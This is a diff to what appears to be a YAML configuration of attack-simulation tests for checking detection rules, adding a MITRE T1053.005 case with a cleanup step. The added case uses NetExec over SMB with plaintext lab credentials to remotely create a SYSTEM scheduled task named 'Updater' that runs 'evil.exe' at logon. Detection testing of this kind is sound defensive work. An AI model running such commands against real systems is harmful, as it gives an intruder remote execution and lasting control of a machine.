@@ -19,3 +19,11 @@
   success_signal: "getting file"
   rule: "Mass file scanning via SMB (potential automated collection)"
   timeout: 600
+
+- id: T1053.005
+  name: Scheduled task persistence
+  attack: "nxc smb 192.168.158.20 -u 'Win10 Lab' -p 1234 -x 'schtasks /create /tn Updater /tr C:\\Windows\\Temp\\evil.exe /sc onlogon /ru SYSTEM /f'"
+  success_signal: "SUCCESS:"
+  rule: "Scheduled task created (possible persistence)"
+  timeout: 600
+  cleanup: "nxc smb 192.168.158.20 -u 'Win10 Lab' -p 1234 -x 'schtasks /delete /tn Updater /f'"
